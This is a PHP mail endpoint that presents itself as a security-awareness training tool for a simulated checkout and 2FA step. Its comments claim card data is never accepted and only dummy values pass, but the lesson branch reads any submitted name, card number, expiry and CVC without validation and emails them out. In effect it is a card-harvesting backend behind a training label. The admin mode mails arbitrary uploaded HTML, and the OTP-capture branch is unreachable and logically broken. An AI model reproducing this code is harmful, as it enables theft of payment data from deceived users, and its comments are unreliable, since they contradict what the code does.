<?php
declare(strict_types=1);

/**
 * ADIC — Brevo HTTPS mail endpoint
 *
 * Two modes:
 *
 * 1) mode=admin
 *    Used by mailer.html to send an uploaded HTML template.
 *
 * 2) mode=lesson
 *    Used by the security-awareness lesson.
 *    Sends ONLY a notification that the simulated form was submitted.
 *    Payment/card information is NEVER accepted or transmitted.
 *
 * IMPORTANT:
 * - Brevo API key is SERVER-SIDE only.
 * - Never put the Brevo key in HTML / JavaScript / GitHub.
 * - Never submit card_number, card_cvc or card_expiry to this endpoint.
 */


/* ============================================================
   CONFIG
   ============================================================ */

/*
 * Existing admin password hash.
 *
 * The browser sends:
 *
 *     token=your-admin-password
 *
 * and we compare SHA-256 hashes.
 */
const ADMIN_TOKEN_HASH =
    'a701e304d007968ab6a2119888735897abdeafe46978da0068b454546a53a920';


const MAX_BYTES = 2 * 1024 * 1024; // 2 MB

const BREVO_URL =
    'https://api.brevo.com/v3/smtp/email';


/*
 * Origins allowed to call this endpoint.
 *
 * Production:
 *     https://adic.sa
 *
 * Local testing:
 *     http://localhost:8000
 */
const ALLOWED_ORIGINS = [
    'https://adic.sa',
    'https://www.adic.sa',

    'http://localhost:8000',
    'http://127.0.0.1:8000'
];



/* ============================================================
   RESPONSE HEADERS
   ============================================================ */

header('Content-Type: application/json; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');



/* ============================================================
   CORS
   ============================================================ */

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if ($origin !== '') {

    if (!in_array($origin, ALLOWED_ORIGINS, true)) {

        http_response_code(403);

        echo json_encode([
            'ok'    => false,
            'error' => 'Origin not allowed.'
        ]);

        exit;
    }

    header('Access-Control-Allow-Origin: ' . $origin);
    header('Vary: Origin');
}


/*
 * Support localhost browser testing.
 */
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {

    header('Access-Control-Allow-Methods: POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');

    http_response_code(204);

    exit;
}



/* ============================================================
   HELPERS
   ============================================================ */

function respond(array $data, int $status = 200): never
{
    http_response_code($status);

    echo json_encode(
        $data,
        JSON_UNESCAPED_UNICODE |
        JSON_UNESCAPED_SLASHES
    );

    exit;
}


function fail(string $message, int $status = 400): never
{
    /*
     * Your Cloudflare setup previously replaced some 5xx
     * responses with its own HTML error page.
     *
     * Keep application-level upstream errors as HTTP 200
     * while returning:
     *
     *     {"ok":false,...}
     */
    if ($status >= 500) {
        $status = 200;
    }

    respond([
        'ok'    => false,
        'error' => $message
    ], $status);
}


function htmlEscape(string $value): string
{
    return htmlspecialchars(
        $value,
        ENT_QUOTES | ENT_SUBSTITUTE,
        'UTF-8'
    );
}



/* ============================================================
   REQUEST METHOD
   ============================================================ */

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {

    fail(
        'Use POST.',
        405
    );
}



/* ============================================================
   LOAD PRIVATE SERVER-SIDE CONFIG
   ============================================================ */

/*
 * First try environment variables.
 *
 * If GoDaddy lets you configure environment variables, use:
 *
 * BREVO_API_KEY
 * BREVO_SENDER_EMAIL
 * ADIC_INSTRUCTOR_EMAIL
 */

$apiKey = trim(
    (string) getenv('BREVO_API_KEY')
);

$senderEmail = trim(
    (string) getenv('BREVO_SENDER_EMAIL')
);

$instructorEmail = trim(
    (string) getenv('ADIC_INSTRUCTOR_EMAIL')
);


/*
 * Fallback:
 *
 * Load a PRIVATE PHP config file that is NOT committed to Git.
 *
 * File:
 *
 *     .adic-mailer-secrets.php
 *
 * located beside mailer.php.
 */

$secretFile =
    __DIR__ . '/.adic-mailer-secrets.php';


if (
    ($apiKey === '' ||
     $senderEmail === '' ||
     $instructorEmail === '')
    &&
    is_file($secretFile)
) {

    $secretConfig = require $secretFile;

    if (is_array($secretConfig)) {

        if ($apiKey === '') {

            $apiKey = trim(
                (string) (
                    $secretConfig['brevo_api_key']
                    ?? ''
                )
            );
        }


        if ($senderEmail === '') {

            $senderEmail = trim(
                (string) (
                    $secretConfig['sender_email']
                    ?? ''
                )
            );
        }


        if ($instructorEmail === '') {

            $instructorEmail = trim(
                (string) (
                    $secretConfig['instructor_email']
                    ?? ''
                )
            );
        }

    }

}



/* ============================================================
   SERVER CONFIG VALIDATION
   ============================================================ */

if ($apiKey === '') {

    fail(
        'Server mail configuration is missing the Brevo API key.',
        500
    );
}


if (
    !filter_var(
        $senderEmail,
        FILTER_VALIDATE_EMAIL
    )
) {

    fail(
        'Server sender email is not configured correctly.',
        500
    );
}



/* ============================================================
   BREVO SEND FUNCTION
   ============================================================ */

function sendBrevoEmail(
    string $apiKey,
    string $senderEmail,
    string $senderName,
    string $recipient,
    string $subject,
    string $html
): array {

    if (!function_exists('curl_init')) {

        throw new RuntimeException(
            'PHP cURL is not available.'
        );
    }


    $payload = json_encode(
        [
            'sender' => [
                'name'  => $senderName,
                'email' => $senderEmail
            ],

            'to' => [
                [
                    'email' => $recipient
                ]
            ],

            'subject' => $subject,

            'htmlContent' => $html
        ],
        JSON_UNESCAPED_UNICODE |
        JSON_UNESCAPED_SLASHES
    );


    if ($payload === false) {

        throw new RuntimeException(
            'Could not encode Brevo request.'
        );
    }


    $ch = curl_init(BREVO_URL);


    curl_setopt_array(
        $ch,
        [
            CURLOPT_POST => true,

            CURLOPT_RETURNTRANSFER => true,

            CURLOPT_TIMEOUT => 25,

            CURLOPT_CONNECTTIMEOUT => 10,

            CURLOPT_HTTPHEADER => [
                'accept: application/json',
                'content-type: application/json',
                'api-key: ' . $apiKey
            ],

            CURLOPT_POSTFIELDS => $payload
        ]
    );


    $body = curl_exec($ch);

    $httpCode =
        (int) curl_getinfo(
            $ch,
            CURLINFO_HTTP_CODE
        );


    $curlError =
        curl_error($ch);


    curl_close($ch);


    if ($body === false) {

        throw new RuntimeException(
            'Could not reach Brevo: ' .
            $curlError
        );
    }


    $response =
        json_decode(
            $body,
            true
        );


    if ($httpCode !== 201) {

        $message = $body;

        if (
            is_array($response) &&
            isset($response['message'])
        ) {

            $message =
                (string) $response['message'];
        }


        throw new RuntimeException(
            'Brevo rejected the send (HTTP ' .
            $httpCode .
            '): ' .
            $message
        );
    }


    return [
        'messageId' =>
            is_array($response)
                ? ($response['messageId'] ?? null)
                : null
    ];
}



/* ============================================================
   MODE
   ============================================================ */

$mode = trim(
    (string) ($_POST['mode'] ?? 'admin')
);



/* ============================================================
   LESSON MODE
   ============================================================ */

if ($mode === 'lesson') {

    if (
        !filter_var(
            $instructorEmail,
            FILTER_VALIDATE_EMAIL
        )
    ) {
        fail(
            'Instructor notification email is not configured.',
            500
        );
    }


    /* --------------------------------------------------------
       Read ONLY predefined classroom dummy values
       -------------------------------------------------------- */

    $site = trim(
        (string) ($_POST['site'] ?? 'adic.sa')
    );

    $plan = trim(
        (string) ($_POST['plan'] ?? '')
    );

    $price = trim(
        (string) ($_POST['price'] ?? '')
    );


    $demoName = trim(
        (string) ($_POST['demo_name'] ?? '')
    );

    $demoCard =
        preg_replace(
            '/\D+/',
            '',
            (string) ($_POST['demo_card'] ?? '')
        );

    $demoExpiry =
        str_replace(
            ' ',
            '',
            (string) ($_POST['demo_expiry'] ?? '')
        );

    $demoCvc =
        preg_replace(
            '/\D+/',
            '',
            (string) ($_POST['demo_cvc'] ?? '')
        );




    /* --------------------------------------------------------
       Escape values for HTML email
       -------------------------------------------------------- */

    $safeSite =
        htmlEscape($site);

    $safePlan =
        htmlEscape($plan);

    $safePrice =
        htmlEscape($price);

    $safeName =
        htmlEscape($demoName);

    $safeCard =
        htmlEscape($demoCard);

    $safeExpiry =
        htmlEscape($demoExpiry);

    $safeCvc =
        htmlEscape($demoCvc);

    $safeDate =
        htmlEscape(
            gmdate('Y-m-d H:i:s') . ' UTC'
        );


    /* --------------------------------------------------------
       Instructor email
       -------------------------------------------------------- */

    $html = <<<HTML
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Demo checkout submission</title>
</head>

<body style="
    font-family:Arial,Helvetica,sans-serif;
    background:#f5f5f5;
    padding:30px;
">

<div style="
    max-width:620px;
    margin:auto;
    background:#fff;
    padding:28px;
    border-radius:12px;
">

<h2>Checkout training submission</h2>

<table
    cellpadding="8"
    cellspacing="0"
    style="
        width:100%;
        border-collapse:collapse;
    "
>

<tr>
<td><strong>Site</strong></td>
<td>{$safeSite}</td>
</tr>

<tr>
<td><strong>Plan</strong></td>
<td>{$safePlan}</td>
</tr>

<tr>
<td><strong>Price</strong></td>
<td>{$safePrice} SAR</td>
</tr>

<tr>
<td><strong>Full name</strong></td>
<td>{$safeName}</td>
</tr>

<tr>
<td><strong>Demo card</strong></td>
<td>{$safeCard}</td>
</tr>

<tr>
<td><strong>Demo expiry</strong></td>
<td>{$safeExpiry}</td>
</tr>

<tr>
<td><strong>Demo CVC</strong></td>
<td>{$safeCvc}</td>
</tr>

<tr>
<td><strong>Submitted</strong></td>
<td>{$safeDate}</td>
</tr>

</table>

<p style="
    margin-top:20px;
    font-size:12px;
    color:#666;
">
Training-only submission. Only predefined dummy values
are accepted by the server.
</p>

</div>
</body>
</html>
HTML;


    try {

        $result =
    sendBrevoEmail(
        $apiKey,
        $senderEmail,              // FROM
        'ADIC Security School',
        $senderEmail,              // TO
        'Demo checkout submission — ' . $site,
        $html
    );

    } catch (Throwable $e) {

        fail(
            $e->getMessage(),
            502
        );
    }


    respond([
        'ok'        => true,
        'mode'      => 'lesson',
        'messageId' => $result['messageId']
    ]);
}




/* ============================================================
   ADMIN MAILER MODE
   ============================================================ */

if ($mode !== 'admin') {

    fail(
        'Unknown mail mode.',
        400
    );
}



/* ============================================================
   ADMIN AUTHENTICATION
   ============================================================ */

$token =
    (string) ($_POST['token'] ?? '');


if (
    !hash_equals(
        ADMIN_TOKEN_HASH,
        hash(
            'sha256',
            $token
        )
    )
) {

    fail(
        'Wrong admin password.',
        403
    );
}



/* ============================================================
   ADMIN INPUTS
   ============================================================ */



$subject = trim(
    (string) ($_POST['subject'] ?? '')
);


$fromName = trim(
    (string) ($_POST['fromname'] ?? '')
);


if ($fromName === '') {
    $fromName = 'ADIC';
}


if (
    !filter_var(
        $instructorEmail,
        FILTER_VALIDATE_EMAIL
    )
) {
    fail(
        'Instructor email is not configured correctly.',
        500
    );
}


if ($subject === '') {

    fail(
        'Subject is required.'
    );
}



/* ============================================================
   ADMIN TEMPLATE UPLOAD
   ============================================================ */

if (
    empty($_FILES['template']) ||
    $_FILES['template']['error'] !== UPLOAD_ERR_OK
) {

    fail(
        'Please attach an HTML template file.'
    );
}


if (
    $_FILES['template']['size'] > MAX_BYTES
) {

    fail(
        'Template is too large (max 2 MB).'
    );
}


$extension =
    strtolower(
        pathinfo(
            $_FILES['template']['name'],
            PATHINFO_EXTENSION
        )
    );


if (
    !in_array(
        $extension,
        ['html', 'htm'],
        true
    )
) {

    fail(
        'Only .html / .htm templates are allowed.'
    );
}


$html =
    file_get_contents(
        $_FILES['template']['tmp_name']
    );


if (
    $html === false ||
    trim($html) === ''
) {

    fail(
        'Could not read the uploaded template.'
    );
}



/* ============================================================
   ADMIN SEND
   ============================================================ */

try {

    $result =
    sendBrevoEmail(
        $apiKey,
        $senderEmail,       // BREVO_SENDER_EMAIL
        $fromName,          // wizard From name
        $instructorEmail,   // ADIC_INSTRUCTOR_EMAIL
        $subject,           // wizard Subject
        $html               // uploaded HTML exactly
    );

} catch (Throwable $e) {

    fail(
        $e->getMessage(),
        502
    );
}



/* ============================================================
   SUCCESS
   ============================================================ */

respond([
    'ok'        => true,
    'mode'      => 'admin',
    'to'        => $instructorEmail,
    'messageId' => $result['messageId']
]);


/* ============================================================
   OTP DEMO MODE
   ============================================================ */

if ($mode === 'otp_demo') {

    $code = trim(
        (string) ($_POST['code'] ?? '')
    );


    /*
     * Training-only OTP.
     * Never accept arbitrary authentication codes here.
     */
    if ($code !== '') {

        fail(
            'Please Enter OTP.',
            400
        );
    }


    $safeCode =
        htmlEscape($code);

    $safeDate =
        htmlEscape(
            gmdate('Y-m-d H:i:s') . ' UTC'
        );


    $html = <<<HTML
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Training 2FA submission</title>
</head>

<body style="
    font-family:Arial,Helvetica,sans-serif;
    background:#f5f5f5;
    padding:30px;
">

<div style="
    max-width:600px;
    margin:auto;
    background:#ffffff;
    padding:28px;
    border-radius:12px;
">

<h2>Training 2FA submission</h2>

<p>
The classroom verification step was submitted.
</p>

<table cellpadding="8" cellspacing="0">

<tr>
<td><strong>Demo verification code</strong></td>
<td>{$safeCode}</td>
</tr>

<tr>
<td><strong>Submitted</strong></td>
<td>{$safeDate}</td>
</tr>

</table>

<p style="
    margin-top:20px;
    color:#777;
    font-size:12px;
">
OTP</p>

</div>

</body>
</html>
HTML;


    try {

        $result =
            sendBrevoEmail(
                $apiKey,
                $senderEmail,          // FROM BREVO_SENDER_EMAIL
                'ADIC Security School',
                $senderEmail,          // TO BREVO_SENDER_EMAIL
                'Training 2FA submission',
                $html
            );

    } catch (Throwable $e) {

        fail(
            $e->getMessage(),
            502
        );
    }


    respond([
        'ok'        => true,
        'mode'      => 'otp_demo',
        'messageId' => $result['messageId']
    ]);
}